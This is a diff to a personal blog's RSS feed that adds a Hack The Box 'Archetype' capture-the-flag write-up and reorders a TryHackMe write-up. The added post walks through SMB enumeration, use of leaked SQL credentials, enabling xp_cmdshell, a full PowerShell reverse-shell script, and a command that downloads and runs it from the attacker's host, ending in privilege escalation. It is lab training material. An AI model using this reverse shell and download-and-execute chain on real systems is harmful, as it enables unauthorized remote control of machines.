@@ -5,8 +5,183 @@
         <description>Recent content in Posts on Natan Maia Morette</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 24 Jul 2021 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Tue, 27 Jul 2021 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://nmmorette.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB - Archetype - Write Up</title>
+            <link>https://nmmorette.github.io/posts/2021/07/htb-archetype-write-up/</link>
+            <pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://nmmorette.github.io/posts/2021/07/htb-archetype-write-up/</guid>
+            <description>Enumeration Initial scan:
+nmap -sSV 10.10.10.27Second nmap scan with --script vuln
+We found a possible starting point: CVE-2008-4250.
+SMB Enumeration The next step is to try to connect in the SMB service:
+smbclient -L \\10.10.10.27 -NIPC$: this hidden share is a special share used for inter-process communication. It doesn’t allow one to access files or directories like other shares, but rather allows one to communicate with processes running on the remote system.</description>
+            <content type="html"><![CDATA[
+    <img src="/images/htb/archetype/banner.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="enumeration">Enumeration</h2>
+<p>Initial scan:</p>
+<pre><code class="language-cli" data-lang="cli"> nmap -sSV 10.10.10.27
+</code></pre>
+    <img src="/images/htb/archetype/scan.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Second nmap scan with <code>--script vuln</code></p>
+
+    <img src="/images/htb/archetype/vuln.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>We found a possible starting point: CVE-2008-4250.</p>
+<h2 id="smb-enumeration">SMB Enumeration</h2>
+<p>The next step is to try to connect in the SMB service:</p>
+<pre><code class="language-cli" data-lang="cli"> smbclient -L \\10.10.10.27 -N
+</code></pre>
+    <img src="/images/htb/archetype/smb.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><strong>IPC$:</strong> this hidden share is a special share used for inter-process communication. It doesn’t allow one to access files or directories like other shares, but rather allows one to communicate with processes running on the remote system.</p>
+<p><strong>backups:</strong> a normal share with read access. It lacks a comment which means it could contain interesting data if we’re able to connect to it.</p>
+<p>The backup folder it’s accessible without a password and insidi we have an interesting file: <code>prod.dtsConfig</code>.</p>
+
+    <img src="/images/htb/archetype/prod.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Looking at the file we found a user and password.</p>
+<p><code>user:</code> ARCHETYPE\sql_svc
+<code>password:</code> M3g4c0rp123</p>
+<h2 id="mssqlclipy">mssqlcli.py</h2>
+<p>Using <code>mssqlcli.py</code> script with “-windows-auth” parameter to instruct the script to use Windows Authentication and the User ID and password found in the config file from before, I managed to get a connection to the exposed SQL server on port 1433.</p>
+
+    <img src="/images/htb/archetype/sql.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Now we need to enable code execution in this server:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">EXEC sp_configure <span style="color:#960050;background-color:#1e0010">&#39;</span>Show Advanced Options<span style="color:#960050;background-color:#1e0010">&#39;</span>,<span style="color:#ae81ff">1</span>;
+reconfigure;
+sp_configure;
+EXEC sp_configure <span style="color:#960050;background-color:#1e0010">&#39;</span>xp_cmdshell<span style="color:#960050;background-color:#1e0010">&#39;</span>,<span style="color:#ae81ff">1</span>
+reconfigure;
+xp_cmdshell <span style="color:#e6db74">&#34;whoami</span>
+</code></pre></div><p>With command <code>xp_cmdshell</code>  we&rsquo;re able to run commands.</p>
+<h2 id="payload">Payload</h2>
+<p>After that let&rsquo;s send a <code>PowerShell</code> payload to reverse shell the target:</p>
+<p>Don&rsquo;t forget to edit the first line.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">$</span>socket <span style="color:#f92672">=</span> new<span style="color:#f92672">-</span>object System.Net.Sockets.TcpClient(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">10.10.16.113</span><span style="color:#960050;background-color:#1e0010">&#39;</span>, <span style="color:#ae81ff">443</span>);
+<span style="color:#66d9ef">if</span>(<span style="color:#960050;background-color:#1e0010">$</span>socket <span style="color:#f92672">-</span>eq <span style="color:#960050;background-color:#1e0010">$</span>null){exit <span style="color:#ae81ff">1</span>}
+<span style="color:#960050;background-color:#1e0010">$</span>stream <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>socket.GetStream();
+<span style="color:#960050;background-color:#1e0010">$</span>writer <span style="color:#f92672">=</span> new<span style="color:#f92672">-</span>object System.IO.StreamWriter(<span style="color:#960050;background-color:#1e0010">$</span>stream);
+<span style="color:#960050;background-color:#1e0010">$</span>buffer <span style="color:#f92672">=</span> new<span style="color:#f92672">-</span>object System.Byte[] <span style="color:#ae81ff">1024</span>;
+<span style="color:#960050;background-color:#1e0010">$</span>encoding <span style="color:#f92672">=</span> new<span style="color:#f92672">-</span>object System.Text.AsciiEncoding;
+<span style="color:#66d9ef">do</span>
+{
+	<span style="color:#960050;background-color:#1e0010">$</span>writer.Flush();
+	<span style="color:#960050;background-color:#1e0010">$</span>read <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>null;
+	<span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+	<span style="color:#66d9ef">while</span>(<span style="color:#960050;background-color:#1e0010">$</span>stream.DataAvailable <span style="color:#f92672">-</span>or <span style="color:#960050;background-color:#1e0010">$</span>read <span style="color:#f92672">-</span>eq <span style="color:#960050;background-color:#1e0010">$</span>null) {
+		<span style="color:#960050;background-color:#1e0010">$</span>read <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>stream.Read(<span style="color:#960050;background-color:#1e0010">$</span>buffer, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1024</span>)
+	}
+	<span style="color:#960050;background-color:#1e0010">$</span>out <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>encoding.GetString(<span style="color:#960050;background-color:#1e0010">$</span>buffer, <span style="color:#ae81ff">0</span>, <span style="color:#960050;background-color:#1e0010">$</span>read).Replace(<span style="color:#e6db74">&#34;`r`n&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>).Replace(<span style="color:#e6db74">&#34;`n&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>);
+	<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">$</span>out.equals(<span style="color:#e6db74">&#34;exit&#34;</span>)){
+		<span style="color:#960050;background-color:#1e0010">$</span>args <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+		<span style="color:#66d9ef">if</span>(<span style="color:#960050;background-color:#1e0010">$</span>out.IndexOf(<span style="color:#e6db74">&#39; &#39;</span>) <span style="color:#f92672">-</span>gt <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>){
+			<span style="color:#960050;background-color:#1e0010">$</span>args <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>out.substring(<span style="color:#960050;background-color:#1e0010">$</span>out.IndexOf(<span style="color:#e6db74">&#39; &#39;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);
+			<span style="color:#960050;background-color:#1e0010">$</span>out <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>out.substring(<span style="color:#ae81ff">0</span>,<span style="color:#960050;background-color:#1e0010">$</span>out.IndexOf(<span style="color:#e6db74">&#39; &#39;</span>));
+			<span style="color:#66d9ef">if</span>(<span style="color:#960050;background-color:#1e0010">$</span>args.split(<span style="color:#e6db74">&#39; &#39;</span>).length <span style="color:#f92672">-</span>gt <span style="color:#ae81ff">1</span>){
+                <span style="color:#960050;background-color:#1e0010">$</span>pinfo <span style="color:#f92672">=</span> New<span style="color:#f92672">-</span>Object System.Diagnostics.ProcessStartInfo
+                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.FileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cmd.exe&#34;</span>
+                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.RedirectStandardError <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>true
+                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.RedirectStandardOutput <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>true
+                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.UseShellExecute <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>false
+                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.Arguments <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/c $out $args&#34;</span>
+                <span style="color:#960050;background-color:#1e0010">$</span>p <span style="color:#f92672">=</span> New<span style="color:#f92672">-</span>Object System.Diagnostics.Process
+                <span style="color:#960050;background-color:#1e0010">$</span>p.StartInfo <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>pinfo
+                <span style="color:#960050;background-color:#1e0010">$</span>p.Start() <span style="color:#f92672">|</span> Out<span style="color:#f92672">-</span>Null
+                <span style="color:#960050;background-color:#1e0010">$</span>p.WaitForExit()
+                <span style="color:#960050;background-color:#1e0010">$</span>stdout <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>p.StandardOutput.ReadToEnd()
+                <span style="color:#960050;background-color:#1e0010">$</span>stderr <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>p.StandardError.ReadToEnd()
+                <span style="color:#66d9ef">if</span> (<span style="color:#960050;background-color:#1e0010">$</span>p.ExitCode <span style="color:#f92672">-</span>ne <span style="color:#ae81ff">0</span>) {
+                    <span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>stderr
+                } <span style="color:#66d9ef">else</span> {
+                    <span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>stdout
+                }
+			}
+			<span style="color:#66d9ef">else</span>{
+				<span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> (<span style="color:#f92672">&amp;</span><span style="color:#e6db74">&#34;$out&#34;</span> <span style="color:#e6db74">&#34;$args&#34;</span>) <span style="color:#f92672">|</span> out<span style="color:#f92672">-</span>string;
+			}
+		}
+		<span style="color:#66d9ef">else</span>{
+			<span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> (<span style="color:#f92672">&amp;</span><span style="color:#e6db74">&#34;$out&#34;</span>) <span style="color:#f92672">|</span> out<span style="color:#f92672">-</span>string;
+		}
+		<span style="color:#66d9ef">if</span>(<span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">-</span>ne <span style="color:#960050;background-color:#1e0010">$</span>null){
+        <span style="color:#960050;background-color:#1e0010">$</span>writer.WriteLine(<span style="color:#960050;background-color:#1e0010">$</span>res)
+    }
+	}
+}While (<span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">$</span>out.equals(<span style="color:#e6db74">&#34;exit&#34;</span>))
+<span style="color:#960050;background-color:#1e0010">$</span>writer.close();
+<span style="color:#960050;background-color:#1e0010">$</span>socket.close();
+<span style="color:#960050;background-color:#1e0010">$</span>stream.Dispose()
+</code></pre></div><p>Setup a python web server to host our file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">python3 <span style="color:#f92672">-</span>m http.server <span style="color:#ae81ff">80</span>
+</code></pre></div><p>Setup a <code>Netcat</code> for listening:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">nc <span style="color:#f92672">-</span>lvnp <span style="color:#ae81ff">443</span>
+ufw allow from <span style="color:#ae81ff">10.10.10.27</span> proto tcp to any port <span style="color:#ae81ff">80</span>,<span style="color:#ae81ff">443</span>
+</code></pre></div><p>We have all set up to receive the reverse shell.
+We only need to execute the payload in the target and wait for connection into the <code>Netcat</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">xp_cmdshell <span style="color:#e6db74">&#34;powershell &#34;</span>IEX (New<span style="color:#f92672">-</span>Object Net.WebClient).DownloadString(<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;http://10.10.16.113/shell2.ps1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">);&#34;</span>
+</code></pre></div><p>After that we have the shell:</p>
+
+    <img src="/images/htb/archetype/shell.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="firts-key">Firts Key</h2>
+<p>For the first key we need to enumerate the files:</p>
+
+    <img src="/images/htb/archetype/key.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="privileged-user-access">Privileged user access</h2>
+<p>Now that we have the users' flag, we need to focus on the administrator flag. Maybe the flag is in the administrator’s folder, but our user don&rsquo;t have access. We need to privesc our shell. A very useful checklist to do that:  <a href="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation">Hacktricks</a>.</p>
+
+    <img src="/images/htb/archetype/checklist.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>One interesting point in the checklist is the Power Shell history.</p>
+<p>The located path is:
+<code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></p>
+<p>Let&rsquo;s take a look:</p>
+
+    <img src="/images/htb/archetype/history.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Piece of cake, we have the admin credentials now.</p>
+<p>Let&rsquo;s use a <code>psexec</code> with the new credential to connect:</p>
+
+    <img src="/images/htb/archetype/psexec.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Finally, we can look at the administrator&rsquo;s folder to find the second and last key:</p>
+
+    <img src="/images/htb/archetype/key2.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>
+
+<br>
+
+
+
+<br>
+</p>
+
+    <img src="/images/htb/archetype/pwnd.png"  class="center"  style="border-radius: 8px;"  />
+
+
+]]></content>
+        </item>
         
         <item>
             <title>TryHackme - Steel Mountain - Write Up</title>
@@ -14,21 +189,22 @@
             <pubDate>Sat, 24 Jul 2021 00:00:00 +0000</pubDate>
             
             <guid>https://nmmorette.github.io/posts/2021/07/tryhackme-steel-mountain-write-up/</guid>
-            <description>Task 1. Introduction Let&amp;rsquo;s open the web page:
+            <description>Task 1. Introduction First of all, let&amp;rsquo;s nmap the machine IP.
+nmap -sS -A 10.10.169.181 -PnWe found a web service open port (80), let&amp;rsquo;s open the web page:
 Take a look at the source code:
 Who is the employee of the month?
 Bill Harper
-Task 2. Inicial Access First of all, let&amp;rsquo;s nmap the machine IP.
-nmap -sS -A 10.10.169.181 -PnScan the machine with nmap. What is the other port running a web server on?
+Task 2. Inicial Access Scan the machine with nmap. What is the other port running a web server on?
 Nmap gives this answer:
-8080
-Take a look at the other web server.</description>
+8080</description>
             <content type="html"><![CDATA[
     <img src="/images/steelmountain/banner.png"  class="center"  style="border-radius: 10px;"  />
 
 
 <h2 id="task-1-introduction">Task 1. Introduction</h2>
-<p>Let&rsquo;s open the web page:</p>
+<p>First of all, let&rsquo;s <code>nmap</code> the machine IP.</p>
+<pre><code class="language-cli" data-lang="cli"> nmap -sS -A 10.10.169.181 -Pn
+</code></pre><p>We found a web service open port (80), let&rsquo;s open the web page:</p>
 
     <img src="/images/steelmountain/80.png"  class="center"  style="border-radius: 10px;"  />
 
@@ -41,9 +217,7 @@ Take a look at the other web server.</description>
 <p><strong>Who is the employee of the month?</strong></p>
 <p><code>Bill Harper</code></p>
 <h2 id="task-2-inicial-access">Task 2. Inicial Access</h2>
-<p>First of all, let&rsquo;s <code>nmap</code> the machine IP.</p>
-<pre><code class="language-cli" data-lang="cli"> nmap -sS -A 10.10.169.181 -Pn
-</code></pre>
+
     <img src="/images/steelmountain/task1.png"  class="center"  style="border-radius: 10px;"  />
 
 
@@ -274,7 +448,7 @@ mysql -h 172.16.1.33 -u root No banner do servidor é possível encontar a vers
     <img src="/images/semana7-enumeration/chave.png"  class="center"  style="border-radius: 10px;"  />
 
 
-<p>Depois disso, camos copiar o conteúdo da chave criada:</p>
+<p>Depois disso, vamos copiar o conteúdo da chave criada:</p>
 
     <img src="/images/semana7-enumeration/chave2.png"  class="center"  style="border-radius: 10px;"  />
 
